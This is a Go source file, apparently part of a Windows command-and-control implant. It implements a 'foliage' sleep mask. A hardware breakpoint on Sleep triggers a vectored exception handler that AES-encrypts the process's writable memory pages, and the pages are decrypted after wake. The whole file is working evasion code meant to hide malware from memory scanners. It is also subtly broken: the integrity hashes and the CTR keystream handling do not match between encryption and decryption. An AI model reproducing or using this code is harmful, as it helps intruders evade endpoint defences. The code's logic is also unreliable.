//go:build windows && amd64

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	crand "crypto/rand"
	"sync"
	"syscall"
	"unsafe"
)

const (
	exceptionSingleStep = 0x80000004
	CONTEXT_AMD64       = 0x100000
	CONTEXT_CONTROL     = 0x100001
	pageReadonly        = 0x02
)

type foliageCtx struct {
	mu               sync.Mutex
	key              [32]byte
	iv               [aes.BlockSize]byte
	pages            []foliagePage
	pageHashes       [][]byte
	vehHandle        uintptr
	cbHandle         uintptr
	ready            bool
	encrypted        bool
	integrityFailures int32
}

type foliagePage struct {
	base uintptr
	size uintptr
	prot uint32
}

var (
	foliageInst   foliageCtx
	foliageInit   sync.Once
	fVmQuery      = kernel32.NewProc("VirtualQuery")
	fSetThreadCtx = kernel32.NewProc("SetThreadContext")
	fGetThreadCtx = kernel32.NewProc("GetThreadContext")
	fAddVeh       = kernel32.NewProc("AddVectoredExceptionHandler")
	fRemoveVeh    = kernel32.NewProc("RemoveVectoredExceptionHandler")
)

type fContext struct {
	P1Home       uint64
	P2Home       uint64
	P3Home       uint64
	P4Home       uint64
	P5Home       uint64
	P6Home       uint64
	ContextFlags uint32
	MxCsr        uint32
	SegCs        uint16
	SegDs        uint16
	SegEs        uint16
	SegFs        uint16
	SegGs        uint16
	SegSs        uint16
	EFlags       uint32
	Dr0          uint64
	Dr1          uint64
	Dr2          uint64
	Dr3          uint64
	Dr6          uint64
	Dr7          uint64
	Rax          uint64
	Rcx          uint64
	Rdx          uint64
	Rbx          uint64
	Rsp          uint64
	Rbp          uint64
	Rsi          uint64
	Rdi          uint64
	R8           uint64
	R9           uint64
	R10          uint64
	R11          uint64
	R12          uint64
	R13          uint64
	R14          uint64
	R15          uint64
	Rip          uint64
}

type fMbi struct {
	baseAddr   uintptr
	allocBase  uintptr
	allocProt  uint32
	regionSize uintptr
	state      uint32
	protect    uint32
	typeField  uint32
}

type fMask struct{}

func getFoliageMask() SleepMasker {
	foliageInit.Do(fInit)
	if !foliageInst.ready {
		return nil
	}
	return &fMask{}
}

func fInit() {
	if !enableSleepMask {
		return
	}
	if _, err := crand.Read(foliageInst.key[:]); err != nil {
		return
	}
	foliageInst.ready = true
	registerSleepMask("foliage", func() SleepMasker { return &fMask{} })
}

func (m *fMask) Encrypt() {}

func (m *fMask) Decrypt() {
	foliageInst.mu.Lock()
	defer foliageInst.mu.Unlock()
	if !foliageInst.encrypted {
		return
	}
	fDecryptPages(foliageInst.pages)
	foliageInst.pages = nil
	foliageInst.pageHashes = nil
	foliageInst.encrypted = false
}

func (m *fMask) BeforeSleep(durationMs uintptr) {
	cb := syscall.NewCallback(foliageHandler)
	foliageInst.cbHandle = cb

	veh, _, _ := fAddVeh.Call(1, cb)
	if veh == 0 {
		procSleep.Call(durationMs)
		return
	}
	foliageInst.vehHandle = veh

	if !fSetHWBP(procSleep.Addr()) {
		fRemoveVeh.Call(foliageInst.vehHandle)
		foliageInst.vehHandle = 0
		procSleep.Call(durationMs)
		return
	}

	procSleep.Call(durationMs)
}

func (m *fMask) AfterWake() {
	if foliageInst.vehHandle != 0 {
		fClearHWBP()
		fRemoveVeh.Call(foliageInst.vehHandle)
		foliageInst.vehHandle = 0
	}
	foliageInst.cbHandle = 0
}

func (m *fMask) Name() string { return "foliage" }

//go:uintptrescapes
func foliageHandler(exceptionInfo uintptr) uintptr {
	rec := (*struct {
		code      uint32
		flags     uint32
		record    uintptr
		address   uintptr
		numParams uint32
		params    [15]uintptr
	})(unsafe.Pointer(exceptionInfo))

	if rec.code != exceptionSingleStep {
		return 0
	}

	ctx := (*fContext)(unsafe.Pointer(rec.params[1]))
	if ctx == nil || ctx.Dr0 == 0 {
		return 0
	}

	if ctx.Dr6&1 == 0 {
		return 0
	}

	foliageInst.mu.Lock()
	if foliageInst.encrypted {
		foliageInst.mu.Unlock()
		ctx.Dr7 &^= 1
		ctx.Dr6 = 0
		return 1
	}

	if len(foliageInst.pages) == 0 {
		foliageInst.pages = fEnumPagesLocked()
	}

	if len(foliageInst.pages) > 0 {
		crand.Read(foliageInst.key[:])
		crand.Read(foliageInst.iv[:])
		fEncryptPagesLocked(foliageInst.pages)
	}
	foliageInst.encrypted = true
	foliageInst.mu.Unlock()

	ctx.Dr7 &^= 1
	ctx.Dr6 = 0

	return 1
}

func fSetHWBP(targetAddr uintptr) bool {
	thread := uintptr(0xFFFFFFFFFFFFFFFE)

	var ctx fContext
	ctx.ContextFlags = CONTEXT_AMD64 | 0x10
	ret, _, _ := fGetThreadCtx.Call(thread, uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return false
	}

	ctx.Dr0 = uint64(targetAddr)
	ctx.Dr7 = (ctx.Dr7 & 0xFFFFFFFFFFFC0000) | 0x1

	ret, _, _ = fSetThreadCtx.Call(thread, uintptr(unsafe.Pointer(&ctx)))
	return ret != 0
}

func fClearHWBP() {
	thread := uintptr(0xFFFFFFFFFFFFFFFE)

	var ctx fContext
	ctx.ContextFlags = CONTEXT_AMD64 | 0x10
	ret, _, _ := fGetThreadCtx.Call(thread, uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return
	}

	ctx.Dr0 = 0
	ctx.Dr7 &^= 0x1

	fSetThreadCtx.Call(thread, uintptr(unsafe.Pointer(&ctx)))
}

func fEnumPagesLocked() []foliagePage {
	var out []foliagePage
	addr := uintptr(0)
	for {
		var m fMbi
		ret, _, _ := fVmQuery.Call(addr, uintptr(unsafe.Pointer(&m)), uintptr(unsafe.Sizeof(m)))
		if ret == 0 {
			break
		}
		if m.state == memCommit && m.protect != pageNoaccess && m.protect != pageReadonly {
			out = append(out, foliagePage{base: m.baseAddr, size: m.regionSize, prot: m.protect})
		}
		next := m.baseAddr + m.regionSize
		if next <= addr {
			break
		}
		addr = next
	}
	return out
}

func fEncryptPagesLocked(pages []foliagePage) {
	block, err := aes.NewCipher(foliageInst.key[:])
	if err != nil {
		return
	}
	stream := cipher.NewCTR(block, foliageInst.iv[:])

	foliageInst.pageHashes = make([][]byte, len(pages))

	for i := range pages {
		p := &pages[i]
		if p.size == 0 {
			continue
		}

		buf := unsafe.Slice((*byte)(unsafe.Pointer(p.base)), p.size)

		h := sha256.Sum256(buf)
		foliageInst.pageHashes[i] = h[:]

		var old uint32
		procVirtualProtect.Call(p.base, p.size, uintptr(pageReadwrite), uintptr(unsafe.Pointer(&old)))

		tmp := make([]byte, len(buf))
		copy(tmp, buf)
		stream.XORKeyStream(buf, tmp)
		for j := range tmp { tmp[j] = 0 }

		procVirtualProtect.Call(p.base, p.size, uintptr(old), uintptr(unsafe.Pointer(&old)))
	}
}

func fDecryptPages(pages []foliagePage) {
	block, err := aes.NewCipher(foliageInst.key[:])
	if err != nil {
		return
	}
	stream := cipher.NewCTR(block, foliageInst.iv[:])

	for i := len(pages) - 1; i >= 0; i-- {
		p := &pages[i]
		if p.size == 0 {
			continue
		}

		buf := unsafe.Slice((*byte)(unsafe.Pointer(p.base)), p.size)

		if i < len(foliageInst.pageHashes) && foliageInst.pageHashes[i] != nil {
			h := sha256.Sum256(buf)
			if !bytes.Equal(h[:], foliageInst.pageHashes[i]) {
				foliageInst.integrityFailures++
				if foliageInst.integrityFailures == 1 {
					reportSleepMaskIntegrityFailure("foliage", i)
				}
				continue
			}
		}

		var old uint32
		procVirtualProtect.Call(p.base, p.size, uintptr(pageReadwrite), uintptr(unsafe.Pointer(&old)))

		tmp := make([]byte, len(buf))
		copy(tmp, buf)
		stream.XORKeyStream(buf, tmp)
		for j := range tmp { tmp[j] = 0 }

		procVirtualProtect.Call(p.base, p.size, uintptr(old), uintptr(unsafe.Pointer(&old)))
	}
}

func init() {
	foliageInit.Do(fInit)
}

var _ = syscall.LoadLibrary
